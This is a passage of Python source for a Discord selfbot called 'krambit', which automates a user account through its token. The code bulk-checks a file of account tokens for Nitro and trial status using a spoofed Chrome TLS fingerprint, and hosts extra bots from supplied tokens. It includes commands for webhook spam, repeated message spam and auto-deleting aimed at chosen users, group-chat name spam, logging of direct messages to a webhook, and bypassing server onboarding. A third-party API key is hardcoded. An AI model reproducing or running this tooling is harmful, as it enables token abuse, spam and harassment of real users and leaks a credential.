        'referer': 'https://discord.com/channels/@me',
        'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138", "Google Chrome";v="138"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
        'x-super-properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEzOC4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTM4LjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIn0='
    }

    @staticmethod
    def check_token(token: str, info_type: str, index: int):
        url = TokenChecker.URLS.get(info_type.lower())
        if not url:
            return f"[{index}] {token[:15]}... | {info_type.title()} : Invalid type"

        headers = TokenChecker.HEADERS_TEMPLATE.copy()
        headers['authorization'] = token

        session = tls_client.Session(client_identifier="chrome138", random_tls_extension_order=True)
        try:
            if info_type.lower() == "trial":
                resp = session.post(url, headers=headers, json={})
            else:
                resp = session.get(url, headers=headers)

            if resp.status_code == 200:
                try:
                    data = resp.json()
                    if info_type.lower() == "nitro":
                        status = "Yes" if data else "No"
                        return f"[{index}] {token[:15]}... | Nitro : {status}"
                    elif info_type.lower() == "trial":
                        if 'user_trial_offer' in data and data.get('user_trial_offer'):
                            status = "Yes"
                        else:
                            status = "No"
                        return f"[{index}] {token[:10]}... | Trial : {status}"
                except json.JSONDecodeError:
                    return f"[{index}] {token[:10]}... | {info_type.title()} : JSON Error"

            elif resp.status_code == 401:
                return f"[{index}] {token[:10]}... | {info_type.title()} : Invalid Token"
            elif resp.status_code in (404, 405):
                return f"[{index}] {token[:10]}... | {info_type.title()} : No"
            elif resp.status_code == 429:
                return f"[{index}] {token[:10]}... | {info_type.title()} : Rate Limited"
            else:
                return f"[{index}] {token[:10]}... | {info_type.title()} : HTTP {resp.status_code}"

        except Exception as e:
            return f"[{index}] {token[:15]}... | {info_type.title()} : Error {e}"
        finally:
            session.close()
            

async def upload_n_get_asset_key(image_url: str) -> Optional[str]:
    discord_cdn_pattern = r"https?://(?:cdn\.discordapp\.com|media\.discordapp\.net)/attachments/(\d+)/(\d+)/(.+)"
    match = re.search(discord_cdn_pattern, image_url)
    if match:
        channel_id, attachment_id, filename = match.groups()
        return f"mp:attachments/{channel_id}/{attachment_id}/{filename}"

    try:
        channel = krambit.get_channel(1359380819017338912)
        if channel is None:
            return None

        async with aiohttp.ClientSession() as session:
            async with session.get(image_url) as r:
                if r.status != 200:
                    return None

                image_bytes = await r.read()
                filename = image_url.split("/")[-1].split("?")[0]

                if "." not in filename or len(filename) > 50:
                    filename = (
                        "asset.gif"
                        if "gif" in r.headers.get("Content-Type", "")
                        else "asset.png"
                    )

                msg = await channel.send(
                    file=discord.File(io.BytesIO(image_bytes), filename=filename)
                )

                if not msg.attachments:
                    return None

                att = msg.attachments[0]
                return f"mp:attachments/{channel.id}/{att.id}/{att.filename}"

    except Exception as e:
        print("Asset upload error:", e)
        return None
        

HOST_DIR = "host"
processes = {}

SETTINGS_TEMPLATE = {
    "token": "",
    "antigc": {
        "enabled": True,
        "webhook": ".",
        "gcmsg": "u cant trap son",
        "whitelist": [544612107937906741]
    },
    "dmsniper": {
        "enabled": True,
        "webhook": ".",
        "whitelist": [544612107937906741]
    }
}

@krambit.command()
async def host(ctx, arg=None, arg2=None, arg3=None):
    await ctx.message.delete()
    os.makedirs(HOST_DIR, exist_ok=True)

    if arg and arg2 and not arg3 and arg not in ("start", "edit", "stop", "delete"):
        token = arg
        folder = arg2
        path = os.path.join(HOST_DIR, folder)

        if os.path.exists(path):
            return await ctx.send("Folder already exists.", delete_after=10)

        os.makedirs(path)
        shutil.copy("host.py", os.path.join(path, "host.py"))

        if os.path.exists("ab.txt"):
            shutil.copy("ab.txt", os.path.join(path, "ab.txt"))

        if os.path.exists("krambit.ttf"):
            shutil.copy("krambit.ttf", os.path.join(path, "krambit.ttf"))

        settings = SETTINGS_TEMPLATE.copy()
        settings["token"] = token

        with open(os.path.join(path, "settings.json"), "w", encoding="utf-8") as f:
            json.dump(settings, f, indent=2)

        return await ctx.send(f"Hosted bot created: `{folder}`", delete_after=10)

    if arg == "start" and arg2:
        folder = arg2
        bot_path = os.path.join(HOST_DIR, folder, "host.py")

        if not os.path.exists(bot_path):
            return await ctx.send("Bot not found.", delete_after=10)

        if folder in processes:
            return await ctx.send("Bot already running.", delete_after=10)

        proc = subprocess.Popen([sys.executable, "host.py"], cwd=os.path.join(HOST_DIR, folder))
        processes[folder] = proc

        return await ctx.send(f"Bot `{folder}` started.", delete_after=10)

    if arg == "edit" and arg2 and arg3:
        new_token = arg2
        folder = arg3
        settings_path = os.path.join(HOST_DIR, folder, "settings.json")

        if not os.path.exists(settings_path):
            return await ctx.send("settings.json not found.", delete_after=10)

        with open(settings_path, "r", encoding="utf-8") as f:
            data = json.load(f)

        data["token"] = new_token

        with open(settings_path, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2)

        return await ctx.send(f"Token updated for `{folder}`.", delete_after=10)

    if arg == "stop" and arg2:
        folder = arg2
        proc = processes.get(folder)

        if not proc:
            return await ctx.send("Bot not running.", delete_after=10)

        proc.terminate()
        processes.pop(folder)

        return await ctx.send(f"Bot `{folder}` stopped.", delete_after=10)

    if arg == "delete" and arg2:
        folder = arg2
        path = os.path.join(HOST_DIR, folder)

        if folder in processes:
            processes[folder].terminate()
            processes.pop(folder)

        if not os.path.exists(path):
            return await ctx.send("Folder not found.", delete_after=10)

        shutil.rmtree(path)

        return await ctx.send(f"Bot `{folder}` deleted.", delete_after=10)

    await ctx.send(
        "Usage:\n"
        "`.host <token> <folder>`\n"
        "`.host start <folder>`\n"
        "`.host edit <new_token> <folder>`\n"
        "`.host stop <folder>`\n"
        "`.host delete <folder>`",
        delete_after=10
    )
    
@krambit.command()
async def help(ctx, cmd_name: str = None):
    await ctx.message.delete()

    if not cmd_name:
        await ctx.send("Please provide a command name. Usage: `.help <command>`", delete_after=10)
        return

    cmd = krambit.get_command(cmd_name)
    if not cmd:
        for command in krambit.commands:
            if cmd_name in command.aliases:
                cmd = command
                break

    if not cmd:
        await ctx.send(f"No command named or aliased as '{cmd_name}' found.", delete_after=10)
        return

    msg = f"```js\nCommand Help: {cmd.qualified_name}\n\n"
    msg += f"Usage: {cmd.qualified_name} {cmd.signature}\n"
    if cmd.aliases:
        msg += f"Aliases: {', '.join(cmd.aliases)}\n"
    msg += "```"

    await ctx.send(msg, delete_after=60)
    
        
@krambit.command()
async def ss(ctx, url: str):
    await ctx.message.delete()

    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url

    params = urlencode({
        "access_key": "b861ba18afda4ba2aeb1d80bab2a4161",
        "url": url,
        "wait_until": "page_loaded"
    })
    image_path = "krambit.png"

    try:
        urlretrieve(f"https://api.apiflash.com/v1/urltoimage?{params}", image_path)
        await ctx.send(file=discord.File(image_path))
        os.remove(image_path)
    except Exception as e:
        await ctx.send(f"Error generating screenshot: {e}")
        
menu_art = """
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠄⢤⣠⢷⣝⢦⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠒⣲⣦⣺⣳⣤⡿⠛⠃⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠉⠢⣣⣁⠀⣀⠙⢧⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⡎⠑⢤⡼⡩⡪⠷⠀⠀⡇⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⣶⡞⢯⣠⡻⠼⡇⠀⠀⠀⡇⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⡷⢌⠻⣶⡟⡄⠈⠁⠀⠀⠐⢣⡀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡴⣷⣿⡗⠀⣡⠊⠻⠋⠒⢄⠀⠀⢀⠔⠙⢦⡀⠀
⠀⠀⠀⠀⠀⠀⡠⠊⠁⢺⣿⢇⠜⠁⠀⠀⠀⠀⣠⠗⠊⠀⠀⣠⡺⠆⠀
⠀⠀⠀⠀⣠⣾⡗⠀⠀⢸⡿⠋⠀⠀⠀⠀⠀⠀⠻⣆⠛⣠⣞⢕⢽⣆⠀
⠀⠀⠀⣴⣿⣿⡇⠀⢀⠞⠁⠀⠀⠀⠀⠀⠀⠀⢐⡯⡪⡫⡢⣑⣕⢕⠀
⠀⠀⣼⣿⣿⣿⠇⡰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢮⡺⣾⣮⡪⡳⠀
⢀⣼⣿⣿⣿⠿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠺⣷⣝⢮⠀
⠾⠿⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠪⣻⡇
"""

@krambit.command()
async def menu(ctx, page: int = 1):
    await ctx.message.delete()

    cmds = sorted([c for c in krambit.commands if not c.hidden], key=lambda c: c.qualified_name.lower())
    per_page = 40
    total = len(cmds)
    pages = math.ceil(total / per_page)

    if page < 1 or page > pages:
        await ctx.send(f"Page {page} doesn't exist. Total pages: {pages}.", delete_after=10)
        return

    start = (page - 1) * per_page
    end = start + per_page
    page_cmds = cmds[start:end]

    left = page_cmds[:20]
    right = page_cmds[20:]

    header = f"```js\n{menu_art}\n``````\n<> = required  [] = optional\n[krambit Sb]\n``````js"
    cmd_section = "\n"

    for i in range(20):
        l = f"[{str(start + i + 1).zfill(2)}] {left[i].qualified_name}" if i < len(left) else ""
        r = f"[{str(start + i + 21).zfill(2)}] {right[i].qualified_name}" if i < len(right) else ""
        cmd_section += f"{l.ljust(24)}│ {r}\n"

    cmd_section += "``````js"

    footer_text = "Creator - krambit"
    footer = f"\n{footer_text.center(40)}\n```"

    await ctx.send(f"{header}\n{cmd_section}\n{footer}", delete_after=60)
    
    
@krambit.command()
async def prefix(ctx, np: str):
    global pre
    if np.lower() == "none":
        pre = ""
        await ctx.send("Prefix removed.")
    else:
        pre = np
        await ctx.send(f"Prefix changed to: `{np}`")
      

@krambit.command(aliases=["uh"])
async def usernamehistory(ctx, *args):
    try:
        await ctx.message.delete()
    except:
        pass

    user_input = args[0] if args else None
    page = int(args[1]) if len(args) > 1 and args[1].isdigit() else 1
    per_page = 20
    user_id = ctx.author.id if user_input is None else extract_user_id(user_input)
    if not user_id:
        return await ctx.send("Invalid user.")

    user_data = await krambit.db.db.users.find_one({"_id": user_id}) or {}
    history = user_data.get("username_history", [])
    history = [entry.get("value") for entry in history if "value" in entry]

    user_obj = krambit.get_user(user_id)
    current_name = user_obj.name if user_obj else str(user_id)

    full_list = [current_name] + list(reversed(history))

    total_pages = (len(full_list) + per_page - 1) // per_page
    page = max(1, min(page, total_pages))
    start = (page - 1) * per_page
    end = start + per_page
    entries = full_list[start:end]

    msg = f"```js\n[Username History] - {page}/{total_pages}\nUser: {current_name}\n\n"
    for i, name in enumerate(entries, start=start + 1):
        msg += f"[{i}] {name}\n"
    msg += "```"

    await ctx.send(msg)
    

@krambit.command()
async def tinfo(ctx, info_type: str):
    await ctx.message.delete()

    try:
        with open("tokens.txt", "r", encoding="utf-8") as f:
            tokens = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        await ctx.send("`tokens.txt` not found!", delete_after=5)
        return

    results = []
    for i, token in enumerate(tokens, start=1):
        result = TokenChecker.check_token(token, info_type, i)
        results.append(result)

    output = "\n".join(results)
    for i in range(0, len(output), 1900):
        await ctx.send(f"```js\n{output[i:i+1900]}\n```")

@krambit.command()
async def stream(ctx, sub: str = None, *, arg: str = None):
    global statuses, statusi, statusr
    global stream_images, imagei, stream_large_image, last_image_switch

    await ctx.message.delete()
    
    if sub == "stop":
        statusr = False

        await krambit.change_presence(
            activity=None,
            status=discord.Status.dnd
        )

        await ctx.send("```Stream rotation stopped```", delete_after=3)
        return

    if sub == "lg":
        if not arg:
            return

        urls = [u.strip() for u in arg.split(",") if u.strip()]
        assets = []

        for url in urls:
            asset = await upload_n_get_asset_key(url)
            if asset:
                assets.append(asset)

        if not assets:
            await ctx.send("```Failed to load images```", delete_after=3)
            return

        stream_images = assets
        imagei = 0
        stream_large_image = stream_images[0]
        last_image_switch = time.time()

        await ctx.send("```Large image rotation enabled (30s)```", delete_after=3)
        return

    if not sub:
        return

    raw = f"{sub} {arg}" if arg else sub
    statuses = [s.strip() for s in raw.split(",") if s.strip()]
    statusi = 0

    if statusr:
        await ctx.send("```Stream statuses updated```", delete_after=3)
        return

    statusr = True
    await ctx.send("```Stream status rotation started```", delete_after=3)

    while statusr:
        await ustream()


@krambit.command(aliases=['tti'])
async def texttoimage(ctx, *, txt: str):
    await ctx.message.delete()

    w, h = 3698, 2080
    fpath = "krambit.ttf"

    try:
        words = txt.split()
        long = len(words) > 5
        size, min_size = 300 if not long else 200, 150

        while size > min_size:
            font = ImageFont.truetype(fpath, size)
            lines = textwrap.wrap(txt, width=50 if long else 20)
            total_h = sum(font.getbbox(line)[3] - font.getbbox(line)[1] for line in lines) + (len(lines) - 1) * 10
            if total_h < h - 40:
                break
            size -= 5

        img = Image.new("RGB", (w, h), "black")
        d = ImageDraw.Draw(img)
        g = Image.new("RGB", (w, h), "black")
        gd = ImageDraw.Draw(g)
        font = ImageFont.truetype(fpath, size)
        lines = textwrap.wrap(txt, width=50 if long else 20)
        total_h = sum(font.getbbox(line)[3] - font.getbbox(line)[1] for line in lines) + (len(lines) - 1) * 10
        x, y = (80, (h - total_h) // 2) if not long else (40, 40)

        glow = (255, 255, 255)
        for line in lines:
            tw = font.getbbox(line)[2] - font.getbbox(line)[0]
            if not long:
                tx = (w - tw) // 2
                gd.text((tx, y), line, font=font, fill=glow)
                d.text((tx, y), line, font=font, fill="white")
                y += font.getbbox(line)[3] - font.getbbox(line)[1] + 10
            else:
                if x + tw > w - 40:
                    x, y = 40, y + font.getbbox(line)[3] - font.getbbox(line)[1] + 10
                gd.text((x, y), line, font=font, fill=glow)
                d.text((x, y), line, font=font, fill="white")
                x += tw + 10

        g = g.filter(ImageFilter.GaussianBlur(10))
        final = Image.blend(img, g, 0.6)

        path = "krambit.png"
        final.save(path)
        await ctx.send(file=discord.File(path))
        os.remove(path)

    except IOError:
        await ctx.send("Font file not found.", delete_after=5)
        
        
@krambit.command(aliases=['ad', 'hush', 'stfu'])
async def autodelete(ctx, member: discord.Member):
    await ctx.message.delete()
	
    if member.id not in stfu_users:
        stfu_users[member.id] = True
        
        
@krambit.command(aliases=['sad', 'stophush', 'stfuoff'])
async def stopautodelete(ctx, member: discord.Member):
    await ctx.message.delete()
    
    if member.id in stfu_users:
        del stfu_users[member.id]


headersssss = {
    "Authorization": token,
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0"
}


@krambit.command()
async def cu(ctx, *names: str):
    await ctx.message.delete()

    if not names:
        await ctx.send("Usage: `.cu <name1> [name2]...`", delete_after=5)
        return

    results = []

    async with aiohttp.ClientSession() as session:
        for idx, name in enumerate(names, start=1):
            try:
                payload = {"username": name}
                async with session.post(
                    "https://discord.com/api/v9/users/@me/pomelo-attempt",
                    headers=headersssss,
                    json=payload
                ) as response:
                    if response.status == 200:
                        data = await response.json()
                        if data.get("taken") is True:
                            results.append(f"[{idx}] [-] {name} -> Taken/Unavailable")
                        elif data.get("taken") is False:
                            results.append(f"[{idx}] [+] {name} -> Available")
                        else:
                            results.append(f"[{idx}] [!] {name} -> Unexpected response: {data}")
                    else:
                        results.append(f"[{idx}] [!] {name} -> Request failed ({response.status})")
            except Exception as e:
                results.append(f"[{idx}] [!] Error checking {name}: {e}")

            await asyncio.sleep(1)

    formatted_output = "```js\n[ Username Checker ]\n\n" + "\n".join(results) + "\n```"
    await ctx.send(formatted_output, delete_after=15)
    
@krambit.command(aliases=["agc", "agct"])
async def antigc(ctx, mode: str = None, *, val: str = None):
    agc = cfg["antigc"]
    try: await ctx.message.delete()
    except: pass

    if mode is None or mode == "status":
        s = "enabled" if agc["enabled"] else "disabled"
        w = "Has set" if agc["webhook"] else "Not Set"
        wl = len(agc["whitelist"])
        msg = agc["gcmsg"] or "None"
        await ctx.send(
            f"**Anti-GC Status:** `{s}`\n"
            f"**Webhook:** `{w}`\n"
            f"**GC Rename Message:** `{msg}`\n"
            f"**Whitelisted Users:** `{wl}`",
            delete_after=10
        )
        return

    m = mode.lower()

    if m == "on":
        agc["enabled"] = True
        save_settings(cfg)
        await ctx.send("antigc enabled.", delete_after=3)

    elif m == "off":
        agc["enabled"] = False
        save_settings(cfg)
        await ctx.send("antigc disabled.", delete_after=3)

    elif m == "log" and val:
        agc["webhook"] = val
        save_settings(cfg)
        await ctx.send("Webhook set.", delete_after=3)

    elif m == "msg" and val:
        agc["gcmsg"] = val
        save_settings(cfg)
        await ctx.send(f"GC rename message set to `{val}`.", delete_after=3)

    elif m == "wl" and val:
        ids = re.findall(r"\d{15,}", val)
        if ids:
            added, exists = [], []
            for uid in ids:
                i = int(uid)
                if i not in agc["whitelist"]:
                    agc["whitelist"].append(i)
                    added.append(i)
                else:
                    exists.append(i)
            save_settings(cfg)
            r = ""
            if added: r += f"Added: {' '.join(f'<@{x}>' for x in added)}\n"
            if exists: r += f"Already: {' '.join(f'<@{x}>' for x in exists)}"
            await ctx.send(r.strip(), delete_after=5)
        else:
            await ctx.send("No valid IDs.", delete_after=3)

    elif m == "unwl" and val:
        ids = re.findall(r"\d{15,}", val)
        if ids:
            rem, nf = [], []
            for uid in ids:
                i = int(uid)
                if i in agc["whitelist"]:
                    agc["whitelist"].remove(i)
                    rem.append(i)
                else:
                    nf.append(i)
            save_settings(cfg)
            r = ""
            if rem: r += f"Removed: {' '.join(f'<@{x}>' for x in rem)}\n"
            if nf: r += f"Not in list: {' '.join(f'<@{x}>' for x in nf)}"
            await ctx.send(r.strip(), delete_after=5)
        else:
            await ctx.send("No valid IDs.", delete_after=3)

    elif m == "list":
        wls = agc["whitelist"]
        if not wls:
            await ctx.send("Whitelist is empty.", delete_after=5)
            return
        prog = await ctx.send("```Fetching users...```")
        msg = "**Whitelisted Users:**\n```(id) | name\n"
        total = len(wls)
        for i, uid in enumerate(wls, 1):
            u = krambit.get_user(uid)
            if u is None:
                try: u = await krambit.fetch_user(uid)
                except: u = None
            name = u.name if u else "Unknown"
            msg += f"{uid} | {name}\n"
            if i % 5 == 0 or i == total:
                percent = int((i / total) * 100)
                await prog.edit(content=f"```[{percent}%] Completed\nFetched {i}/{total}...```")
            await asyncio.sleep(0.2)
        msg += "```"
        await prog.delete()
        await ctx.send(msg, delete_after=15)

    else:
        await ctx.send(
            "`.antigc on/off`\n"
            "`.antigc log <webhook>`\n"
            "`.antigc msg <name>`\n"
            "`.antigc wl <@user/id>...`\n"
            "`.antigc unwl <@user/id>...`\n"
            "`.antigc list`\n"
            "`.antigc status`",
            delete_after=20
        )
        
        
@krambit.command(aliases=['displayname'])
async def setname(ctx, *, name: str = None):
    if not name:
        await ctx.send("```Please provide a name to set```", delete_after=5)
        return

    await ctx.message.delete()    
    
    payload = {
        "global_name": name
    }

    response = sesh.patch("https://discord.com/api/v10/users/@me", json=payload, headers=globalhead)
    
    if response.status_code == 200:
        await ctx.send(f"```Successfully set display name to: {name}```", delete_after=5)
    else:
        await ctx.send(f"```Failed to update display name: {response.status_code}```", delete_after=10)       


@krambit.command(aliases=['ap2'])
async def autopressure2(ctx, *, message: str):
    global ap2
    if ap2:
        await ctx.message.delete()
        return

    ap2 = True
    await ctx.message.delete()
    await ap2task(ctx, message)

@krambit.command(aliases=['ap2e'])
async def stopautopressure2(ctx):
    global ap2
    ap2 = False
    await ctx.message.delete()


active_vc_guild = None


@krambit.command()
async def vc(ctx, subcommand=None, *args):
    await ctx.message.delete()

    if subcommand is None:
        return await ctx.send(
            "Voice Channel Commands:\n"
            "• vc join <channel_id> (guild_id)\n"
            "• vc list (guild_id)\n"
            "• vc leave (guild_id)\n"
            "• vc status\n"
            "• vc mute (guild_id)\n"
            "• vc unmute (guild_id)\n"
            "• vc deaf (guild_id)\n"
            "• vc undeaf (guild_id)",
            delete_after=10
        )

    if subcommand == "join":
        await vc_join(ctx, *args)
    elif subcommand == "list":
        await vc_list(ctx, *args)
    elif subcommand == "leave":
        await vc_leave(ctx, *args)
    elif subcommand == "status":
        await vc_status(ctx)
    elif subcommand == "mute":
        await vc_mute(ctx, *args)
    elif subcommand == "unmute":
        await vc_unmute(ctx, *args)
    elif subcommand == "deaf":
        await vc_deaf(ctx, *args)
    elif subcommand == "undeaf":
        await vc_undeaf(ctx, *args)
    else:
        await ctx.send("Invalid subcommand", delete_after=3)


def get_guild(ctx, guild_id):
    return ctx.bot.get_guild(int(guild_id)) if guild_id else ctx.guild

async def vc_join(ctx, channel_id, guild_id=None):
    global active_vc_guild
    guild = get_guild(ctx, guild_id)
    channel = guild.get_channel(int(channel_id))
    if not channel:
        return await ctx.send("Channel not found", delete_after=5)

    if active_vc_guild and active_vc_guild != guild.id:
        old = ctx.bot.get_guild(active_vc_guild)
        if old and old.voice_client:
            await old.voice_client.disconnect(force=True)

    voice_client = guild.voice_client
    if voice_client:
        await voice_client.move_to(channel, reconnect=True)
    else:
        await channel.connect(reconnect=True)

    active_vc_guild = guild.id
    await ctx.send(f"Joined {channel.name}", delete_after=5)

async def vc_leave(ctx, guild_id=None):
    global active_vc_guild
    guild = get_guild(ctx, guild_id)
    voice_client = guild.voice_client
    if not voice_client:
        return await ctx.send("Not connected", delete_after=5)

    await voice_client.disconnect(force=True)
    if active_vc_guild == guild.id:
        active_vc_guild = None
    await ctx.send("Left voice channel", delete_after=5)

async def vc_list(ctx, guild_id=None):
    guild = get_guild(ctx, guild_id)
    chans = [c.name for c in guild.voice_channels]
    if not chans:
        return await ctx.send("No voice channels", delete_after=5)
    await ctx.send("\n".join(chans), delete_after=10)

async def vc_status(ctx):
    global active_vc_guild
    guild = ctx.guild
    if active_vc_guild and guild.id != active_vc_guild:
        return await ctx.send("Bot active in another guild", delete_after=5)
    voice_client = guild.voice_client
    if not voice_client or not guild.me or not guild.me.voice:
        return await ctx.send("Not connected", delete_after=5)
    await ctx.send(
        f"VC: {voice_client.channel.name}\n"
        f"Muted: {guild.me.voice.self_mute}\n"
        f"Deafened: {guild.me.voice.self_deaf}",
        delete_after=8
    )

async def vc_mute(ctx, guild_id=None):
    global active_vc_guild
    guild = get_guild(ctx, guild_id)
    if active_vc_guild and guild.id != active_vc_guild:
        return await ctx.send("Bot active in another guild", delete_after=5)
    voice_client = guild.voice_client
    if not voice_client or not guild.me or not guild.me.voice:
        return await ctx.send("Not connected", delete_after=5)
    await guild.change_voice_state(
        channel=voice_client.channel,
        self_mute=True,
        self_deaf=guild.me.voice.self_deaf
    )
    await ctx.send("Muted", delete_after=5)

async def vc_unmute(ctx, guild_id=None):
    global active_vc_guild
    guild = get_guild(ctx, guild_id)
    if active_vc_guild and guild.id != active_vc_guild:
        return await ctx.send("Bot active in another guild", delete_after=5)
    voice_client = guild.voice_client
    if not voice_client or not guild.me or not guild.me.voice:
        return await ctx.send("Not connected", delete_after=5)
    await guild.change_voice_state(
        channel=voice_client.channel,
        self_mute=False,
        self_deaf=guild.me.voice.self_deaf
    )
    await ctx.send("Unmuted", delete_after=5)

async def vc_deaf(ctx, guild_id=None):
    global active_vc_guild
    guild = get_guild(ctx, guild_id)
    if active_vc_guild and guild.id != active_vc_guild:
        return await ctx.send("Bot active in another guild", delete_after=5)
    voice_client = guild.voice_client
    if not voice_client or not guild.me or not guild.me.voice:
        return await ctx.send("Not connected", delete_after=5)
    await guild.change_voice_state(
        channel=voice_client.channel,
        self_mute=guild.me.voice.self_mute,
        self_deaf=True
    )
    await ctx.send("Deafened", delete_after=5)

async def vc_undeaf(ctx, guild_id=None):
    global active_vc_guild
    guild = get_guild(ctx, guild_id)
    if active_vc_guild and guild.id != active_vc_guild:
        return await ctx.send("Bot active in another guild", delete_after=5)
    voice_client = guild.voice_client
    if not voice_client or not guild.me or not guild.me.voice:
        return await ctx.send("Not connected", delete_after=5)
    await guild.change_voice_state(
        channel=voice_client.channel,
        self_mute=guild.me.voice.self_mute,
        self_deaf=False
    )
    await ctx.send("Undeafened", delete_after=5)

    
@krambit.command()
async def bypassguild(ctx, guild_id: int):
    await ctx.message.delete()    
    
    session = requests.Session()
    
    try:
        onboarding_responses_seen = {}
        onboarding_prompts_seen = {}
        onboarding_responses = []

        response = session.get(
            f"https://discord.com/api/v10/guilds/{guild_id}/onboarding",
            headers=globalhead
        )

        if response.status_code == 200:
            data = response.json()
            now = int(datetime.now().timestamp())

            for prompt in data["prompts"]:
                onboarding_responses.append(prompt["options"][0]["id"])
                onboarding_prompts_seen[prompt["id"]] = now

                for option in prompt["options"]:
                    if option:
                        onboarding_responses_seen[option["id"]] = now

            json_data = {
                "onboarding_responses": onboarding_responses,
                "onboarding_prompts_seen": onboarding_prompts_seen,
                "onboarding_responses_seen": onboarding_responses_seen,
            }

            post_response = session.post(
                f"https://discord.com/api/v10/guilds/{guild_id}/onboarding-responses",
                headers=globalhead,
                json=json_data
            )

            if post_response.status_code == 200:
                await ctx.send(f"Bypassed Guild `{guild_id}`", delete_after=10)
            else:
                error_msg = post_response.json().get("message", "Unknown error")
                await ctx.send(f"Failed to bypass guild: {error_msg}", delete_after=10)
        else:
            await ctx.send(f"Failed to access guild: {response.json().get('message', 'Missing Access')}", delete_after=10)

    except Exception as e:
        await ctx.send(f"An error occurred: {e}")

@krambit.command()
async def webhook(ctx, action: str, *args):
    await ctx.message.delete()

    if action == "create":
        name = " ".join(args)
        wh = await ctx.channel.create_webhook(name=name)
        await ctx.send(f"Created: `{name}`\n{wh.url}", delete_after=5)

    elif action in ["delete", "remove"]:
        wh_url = args[0]
        async with aiohttp.ClientSession() as session:
            async with session.get(wh_url) as resp:
                if resp.status == 200:
                    async with session.delete(wh_url) as delete_resp:
                        if delete_resp.status == 204:
                            await ctx.send("Webhook deleted.", delete_after=5)
                        else:
                            await ctx.send("Failed to delete webhook.", delete_after=5)
                else:
                    await ctx.send("Invalid webhook URL.", delete_after=5)

    elif action == "spam":
        if len(args) < 3:
            await ctx.send("Usage: `.webhook spam <url> <amount> <message>`", delete_after=5)
            return

        wh_url = args[0]
        amount = int(args[1])
        content = " ".join(args[2:])

        async with aiohttp.ClientSession() as session:
            for _ in range(amount):
                await session.post(wh_url, json={
                    "content": content,
                    "avatar_url": "https://cdn.discordapp.com/avatars/1390359577924604054/c3cb22ea4dfe801c48354e2fdb6587e1.webp?size=2048",
                    "username": "krambit > you"
                })
                await asyncio.sleep(2.4)

        print("[+] Spammed to the given webhook")

    elif action == "list":
        webhooks = await ctx.channel.webhooks()
        if not webhooks:
            await ctx.send("No webhooks.", delete_after=5)
        else:
            txt = "\n".join([f"`{w.name}` - `{w.url}`" for w in webhooks])
            await ctx.send(f"**Webhooks:**\n{txt}", delete_after=10)
            


@krambit.command()
async def dm(ctx, act: str = None, arg: str = None):
    await ctx.message.delete()
    cfg = load_settings(file)
    dmcfg = cfg["dmsniper"]

    if act not in ["log", "wl", "unwl"]:
        await ctx.send("`.dm log <webhook>`, `.dm wl @user`, `.dm unwl @user`", delete_after=5)
        return

    if act == "log":
        if not arg:
            await ctx.send("Usage: `.dm log <webhook>`", delete_after=5)
            return
        dmcfg["webhook"] = arg
        save_settings(cfg)
        await ctx.send("Webhook set for DM sniping.", delete_after=5)

    elif act == "wl":
        try:
            user = await commands.UserConverter().convert(ctx, arg)
        except commands.BadArgument:
            await ctx.send("Usage: `.dm wl @user`", delete_after=5)
            return
        if user.id not in dmcfg["whitelist"]:
            dmcfg["whitelist"].append(user.id)
            save_settings(cfg)
            await ctx.send(f"Whitelisted {user.name}.", delete_after=5)
        else:
            await ctx.send(f"{user.name} is already whitelisted.", delete_after=5)

    elif act == "unwl":
        try:
            user = await commands.UserConverter().convert(ctx, arg)
        except commands.BadArgument:
            await ctx.send("Usage: `.dm unwl @user`", delete_after=5)
            return
        if user.id in dmcfg["whitelist"]:
            dmcfg["whitelist"].remove(user.id)
            save_settings(cfg)
            await ctx.send(f"Removed {user.name} from whitelist.", delete_after=5)
        else:
            await ctx.send(f"{user.name} is not in whitelist.", delete_after=5)


GN_FILE = "gcname_tasks.json"

def load_gn():
    if not os.path.exists(GN_FILE):
        return {}
    with open(GN_FILE, "r") as f:
        return json.load(f)

def save_gn(data):
    with open(GN_FILE, "w") as f:
        json.dump(data, f, indent=2)

gn_saved = load_gn()
gcstatus = {}

# restore flags at import time (NOT on_ready)
for cid in gn_saved:
    gcstatus[int(cid)] = True

# =======================
# COMMANDS
# =======================

@krambit.command(aliases=["gn"])
async def spamgcname(ctx, channel_id: int, *args):
    await ctx.message.delete()

    if len(args) < 1:
        return await ctx.send("Provide at least one name.", delete_after=5)

    try:
        delay = float(args[-1])
        names = " ".join(args[:-1])
